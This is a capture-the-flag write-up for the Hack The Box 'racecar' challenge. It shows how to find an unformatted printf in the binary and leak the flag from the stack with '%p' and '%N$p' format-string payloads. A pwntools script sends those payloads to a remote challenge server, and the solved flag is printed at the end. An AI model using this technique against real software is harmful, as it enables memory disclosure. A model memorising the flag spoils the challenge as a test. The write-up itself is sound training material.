# racecar

> Write-up author: jon-brandy

## DESCRIPTION:
Did you know that racecar spelled backwards is racecar? Well, now that you know everything about racing, win this race and get the flag!

## HINT:
- NONE

## STEPS:
1. First, unzip the file given and enter `hackthebox` as the password.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/207557130-3fe9ba23-8bcb-4e88-aa13-5268f073a7c5.png)


2. Next, check the file type.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/207557218-d4234e3c-3953-4400-bbcc-41b7e95cbfd9.png)


3. It's an ELF 32 bit file, dynamically linked and luckily not stripped.
4. Now check the file's protector.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/207557439-109f1672-662f-4626-99f8-f1332be2609f.png)


5. Hmm.. Looks like there's no vuln we can utilize here.
6. Anyway, let's run the file.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/207557828-d7de0ace-f121-41d7-87c4-4cf18ad7482d.png)


![image](https://user-images.githubusercontent.com/70703371/207557903-9ccaf724-8926-497e-8e6c-f0c44893a15f.png)


![image](https://user-images.githubusercontent.com/70703371/207557945-a8cc3667-034d-47d1-a182-f6ee9c8e4b70.png)


![image](https://user-images.githubusercontent.com/70703371/207557993-c0842a28-250f-4334-8404-0a60ed55e99d.png)



![image](https://user-images.githubusercontent.com/70703371/207558779-ab2e8e92-5f67-4ce2-9c3e-3ff392f6c954.png)



![image](https://user-images.githubusercontent.com/70703371/207558766-204d621a-4ad0-432d-a2f5-5ee2961621b6.png)


7. Let's run the remote server.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/207558976-9a6ad069-a3a0-4934-82c9-3b4872ec777e.png)


8. Follow the same steps as before.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/207559114-b0da1ce8-c96f-48ac-853a-4efcc5066a68.png)


9. Let's decompile the file using ghidra.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/207559895-986815be-edeb-4683-9478-e3d36c911d04.png)


10. Since we want to know what happen we the program asked us to enter the string, so let's check the `car_menu()` function.

> CAR_MENU()

![image](https://user-images.githubusercontent.com/70703371/207561282-42b1ab93-4e2d-44c2-9ce5-96de15643217.png)


11. Looks like we found the vuln here.


![image](https://user-images.githubusercontent.com/70703371/207561369-793e05fb-0033-4a87-a14f-068e98c0a74d.png)


![image](https://user-images.githubusercontent.com/70703371/207561487-5f783413-f004-416e-a5d0-8b25e6452fa3.png)


12. We can do `format strings attack`, because there's no identifier specified at the `printf()` function.
13. Run the file again, but this time in **gdb** and create the `flag.txt` first.
14. At this session, input `%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p` as the input 


![image](https://user-images.githubusercontent.com/70703371/207562117-efe8541d-b6e8-4398-be85-1bc56f1e09c3.png)


> RESULT

![image](https://user-images.githubusercontent.com/70703371/207567229-8c5649fe-32f8-491b-96af-675bac67da98.png)


15. Great we reached the next step now.
16. Based from the **ghidra** we know this variable stored the **flag** content


![image](https://user-images.githubusercontent.com/70703371/207573182-4c3531ad-4872-486b-b928-63eadb3986e5.png)


> IT HAS 44 BYTES AS THE BUFFER

![image](https://user-images.githubusercontent.com/70703371/207573552-03ea8f31-4fe7-4932-bb31-bd95bb59a9eb.png)


17. Since we know the buffer is 44 bytes, then we need to find the offset of the `__*format`. To find that, since we can't loop to run the file.
18. We can find the offset by input it manually from 1 - 44. -> **(%1-44$s)**.
19. Got a string when i tried to input `%12$s`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/207577158-7422df20-9e50-4f19-b53d-6761213df5de.png)


20. It means the start offset of the flag is 12.
21. Let's continue.

> INPUT -> %12$p %13$p 


![image](https://user-images.githubusercontent.com/70703371/207580551-68948635-0c31-46c4-b9ed-33557710e0c3.png)


##### NOTES: Changed the 's' to 'p', because we would get segmentation fault. Just need the hex value.


> CONTINUE -> %12$p %13$p %14$p 


![image](https://user-images.githubusercontent.com/70703371/207580724-8ac03866-2534-4e05-8dd6-ddb58d9db7fd.png)


> CONTINUE -> %12$p %13$p %14$p %15$p 


![image](https://user-images.githubusercontent.com/70703371/207580928-b1531015-450d-47cd-b451-e0952b13ca67.png)


> ETC..

22. To simply automate this, i made a python script to solve this challenge:

> THE SCRIPT

```py
from pwn import *
import os

'''
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


#gdbscript = '''
#init-pwndbg
#continue
'''.format(**locals())
exe = '.racecar'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
'''

os.system('clear')
context.log_level = 'debug' 
payload = ""

for i in range(12, 13):
    payload += "%" + str(i) + "$p " # sh.sendline('%' + str(i) + '$s')

sh = remote('157.245.41.35', 30606)
sh.recvuntil(": ")
sh.sendline(b'Nicolas')
sh.recvuntil(": ")
sh.sendline(b'Nic')
sh.recvuntil("> ")
sh.sendline(b'2')
sh.recvuntil("> ")
sh.sendline(b'1')
sh.recvuntil("> ")
sh.sendline(b'2')
sh.recvuntil("> ")
sh.sendline(payload)
sh.recv()
result = sh.recv()
print(result)


output = (result.decode("utf-8").split("m\n"))[1]
output = output.split()

flag = ""
for items in output:
    flag += p32(int(items, base = 16)).decode("utf-8") #base 16 -> hex , then decode it

print(flag)
```

23. Try to input 13 as the end offset of the flag.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/207584221-f3856834-bfcb-4fb5-9a2a-d5906b2ca9d1.png)


24. Got the prefix only.
25. So increment the second parameter of the loop until i got the complete flag.
26. Turns out, i got the flag when the second parameter value is 223.

> RESULT


![image](https://user-images.githubusercontent.com/70703371/207584718-d45605b4-30ed-4bcd-a63d-0af51c2dbe9e.png)


27. Finally, we got the flag!


## FLAG

```
HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}
```



